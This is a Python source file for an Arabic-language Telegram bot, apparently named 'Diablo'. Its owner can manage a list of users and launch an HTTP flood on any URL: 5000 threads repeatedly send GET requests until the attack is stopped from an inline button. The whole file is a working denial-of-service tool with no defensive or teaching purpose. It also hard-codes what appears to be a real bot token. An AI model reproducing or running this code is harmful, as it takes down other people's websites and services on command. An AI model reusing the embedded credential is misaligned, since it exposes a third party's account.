import httpx
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio
import os

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

def ensure_file_exists(filename):
    """تأكد من وجود الملف، وإنشائه إذا لم يكن موجودًا"""
    if not os.path.exists(filename):
        with open(filename, 'w') as file:
            pass  # فقط إنشاء الملف الفارغ

def read_users():
    ensure_file_exists('owners.txt')
    ensure_file_exists('normal_users.txt')

    try:
        with open('owners.txt', 'r') as file:
            Owner.extend(file.read().splitlines())
    except Exception as e:
        pass
        
    try:
        with open('normal_users.txt', 'r') as file:
            NormalUsers.extend(file.read().splitlines())
    except Exception as e:
        pass

read_users()

# متغيرات للتحكم في الهجوم
bytes_transferred = 0
lock = threading.Lock()
stop_attack_event = threading.Event()

async def attack(url):
    """تنفيذ الهجوم عبر إرسال طلبات متتابعة"""
    global bytes_transferred
    async with httpx.AsyncClient() as client:
        while not stop_attack_event.is_set():
            try:
                response = await client.get(url)
                data = response.content
                with lock:
                    bytes_transferred += len(data)
            except Exception:
                pass

async def start_attack(url):
    """بدء الهجوم عبر عدة خيوط"""
    stop_attack_event.clear()
    tasks = []
    with ThreadPoolExecutor(max_workers=5000) as executor:
        loop = asyncio.get_event_loop()
        for _ in range(5000):
            tasks.append(loop.run_in_executor(executor, lambda: asyncio.run(attack(url))))
    await asyncio.gather(*tasks)

def stop_attack():
    """إيقاف الهجوم"""
    stop_attack_event.set()

def calculate_speed():
    """حساب سرعة النقل ومراقبة الأداء"""
    global bytes_transferred
    while not stop_attack_event.is_set():
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)
            bytes_transferred = 0

# يجب تعيين التوكن بشكل مباشر
TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'  # هنا يجب أن تضع توكن البوت الخاص بك
if not TOKEN:
    raise Exception('Bot token is not defined')

bot = telebot.TeleBot(TOKEN)

def is_owner(user_id):
    """التحقق من صحة المالك"""
    return str(user_id) in Owner

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """التعامل مع رسالة البدء من المستخدم"""
    if is_owner(message.from_user.id):
        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
    else:
        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
def callback_query(call):
    """التعامل مع الردود التفاعلية"""
    if call.data == "add_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
        bot.register_next_step_handler(msg, process_add_user)
    elif call.data == "remove_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
        bot.register_next_step_handler(msg, process_remove_user)
    elif call.data == "start_attack":
        msg = bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
        bot.register_next_step_handler(msg, process_start_attack)
    elif call.data == "stop_attack":
        stop_attack()
        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")def process_add_user(message):
    """إضافة مستخدم إلى القائمة"""
    user_id = message.text.strip()
    if user_id and user_id not in NormalUsers:
        try:
            with open('normal_users.txt', 'a') as file:
                file.write(user_id + '\n')
            NormalUsers.append(user_id)
            bot.reply_to(message, "تمت إضافة المستخدم بنجاح.")
        except Exception:
            bot.reply_to(message, "حدث خطأ أثناء إضافة المستخدم.")
    else:
        bot.reply_to(message, "المستخدم موجود بالفعل في القائمة أو معرف المستخدم غير صحيح.")

def process_remove_user(message):
    """إزالة مستخدم من القائمة"""
    user_id = message.text.strip()
    if user_id in NormalUsers:
        try:
            NormalUsers.remove(user_id)
            with open('normal_users.txt', 'w') as file:
                for user in NormalUsers:
                    file.write(user + '\n')
            bot.reply_to(message, "تمت إزالة المستخدم بنجاح.")
        except Exception:
            bot.reply_to(message, "حدث خطأ أثناء إزالة المستخدم.")
    else:
        bot.reply_to(message, "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")

def process_start_attack(message):
    """بدء هجوم على الهدف المحدد"""
    url = message.text.strip()
    if url:
        bot.reply_to(message, f"بدء الهجوم على: {url}")
        speed_thread = threading.Thread(target=calculate_speed, daemon=True)
        speed_thread.start()
        attack_thread = threading.Thread(target=lambda: asyncio.run(start_attack(url)))
        attack_thread.start()
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "الهجوم جاري. اضغط على الزر أدناه لإيقاف الهجوم:", reply_markup=markup)
    else:
        bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")

def main():
    """تشغيل البوت"""
    bot.polling()
